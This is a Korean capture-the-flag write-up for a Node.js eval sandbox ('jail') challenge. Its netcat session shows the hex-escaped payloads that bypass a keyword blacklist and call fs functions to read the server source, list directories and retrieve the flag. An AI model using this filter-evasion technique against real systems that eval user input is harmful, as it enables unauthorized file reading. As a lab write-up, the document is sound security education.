# jail - Writeup

Node.js에서의 Sandbox Jail 문제다.

___

`require`로 모듈을 임포트한다.

`.`이 필터링되어 있지만 `require("module_name")["function_name"](arguments)` 꼴로 함수를 실행시킬 수 있다.

파일을 읽으려고 했으나 `ad`와 같은 함수 이름의 일부분을 필터링한다.

하지만 UTF8 인코딩을 사용해서 쉽게 우회할 수 있다.

```
C:\Users\Safflower>nc challenges.whitehatcontest.kr 5959
Hello Java-Script Jail
type: hint, quit
> __filename
your input /home/jail/app/index.js
> require("fs")["\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63"](__filename)
your input /* eslint-disable no-unused-vars,no-console, no-undefined, no-underscore-dangle */
const readline = require('readline');
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const checker = (input) => (new RegExp(/with|\.|;|new| |'|child|crypto|os|http|dns|net|tr|tty|zlib|punycode|util|url|ad|nc|>|`|\+|ex|=/i).test(input));

const result = (answer) =>{
  const Array = undefined;
  const Boolean = undefined;
  const Date = undefined;
  const global = undefined;
  const Error = undefined;
  const EvalError = undefined;
  const Function = undefined;
  const Number = undefined;
  const Object = undefined;
  const RangeError = undefined;
  const ReferenceError = undefined;
  const String = undefined;
  const SyntaxError = undefined;
  const TypeError = undefined;
  const URIError = undefined;
  const JSON = undefined;
  const Math = undefined;
  const decodeURIComponent = undefined;
  const encodeURI = undefined;
  const encodeURIComponent = undefined;
  const isFinite = undefined;
  const isNaN = undefined;
  const parseFloat = undefined;
  const parseInt = undefined;
  const ArrayBuffer = undefined;
  const DTRACE_HTTP_CLIENT_REQUEST = undefined;
  const DTRACE_HTTP_CLIENT_RESPONSE = undefined;
  const DTRACE_HTTP_SERVER_REQUEST = undefined;
  const DTRACE_HTTP_SERVER_RESPONSE = undefined;
  const DTRACE_NET_SERVER_CONNECTION = undefined;
  const DTRACE_NET_STREAM_END = undefined;
  const DataView = undefined;
  const Float32Array = undefined;
  const Float64Array = undefined;
  const Int16Array = undefined;
  const Int32Array = undefined;
  const Int8Array = undefined;
  const Map = undefined;
  const Promise = undefined;
  const Proxy = undefined;
  const Set = undefined;
  const Symbol = undefined;
  const Uint16Array = undefined;
  const Uint32Array = undefined;
  const Uint8Array = undefined;
  const Uint8ClampedArray = undefined;
  const WeakMap = undefined;
  const WeakSet = undefined;
  const assert = undefined;
  const clearImmediate = undefined;
  const clearInterval = undefined;
  const clearTimeout = undefined;
  const escape = undefined;
  const events = undefined;
  const setImmediate = undefined;
  const setInterval = undefined;
  const setTimeout = undefined;
  const stream = undefined;
  const unescape = undefined;
  const __defineGetter__ = undefined;
  const __defineSetter__ = undefined;
  const __lookupGetter__ = undefined;
  const __lookupSetter__ = undefined;
  const constructor = undefined;
  const hasOwnProperty = undefined;
  const isPrototypeOf = undefined;
  const propertyIsEnumerable = undefined;
  const toLocaleString = undefined;
  const toString = undefined;
  const valueOf = undefined;
  const rl = undefined;

  try{
    const clean = decodeURI(answer);
    if(checker(clean)) {
      console.log('nop');
      process.exit();
    }
    console.log('your input ' + eval(clean));
  }catch(e) {
    console.log('hm..');
    process.exit();
  }
  return;
};

console.log('Hello Java-Script Jail');
console.log('type: hint, quit');
rl.prompt();
rl.on('line', (line) => {
  switch (line.trim()) {
    case 'hint':
      console.log(checker.toString());
      break;
    case '555ca7cfed49489017c105cb13c557a068cf970c':
      console.log(result.toString());
      break;
    case 'quit':
      process.exit(0);
      break;
    default:
      result(line);
      break;
  }
  rl.prompt();
}).on('close', () => {
  console.log('Bye!');
  process.exit(0);
});

> require("fs")["\x72\x65\x61\x64\x64\x69\x72\x53\x79\x6e\x63"]("/home/jail/app")
your input index.js
> require("fs")["\x72\x65\x61\x64\x64\x69\x72\x53\x79\x6e\x63"]("/home/jail")
your input app,flag
> require("fs")["\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63"]("/home/jail/flag")
your input flag is {easy~esay!easy?_Jav4-scr1pt~yay}
> quit
```

## Answer

flag: `easy~esay!easy?_Jav4-scr1pt~yay`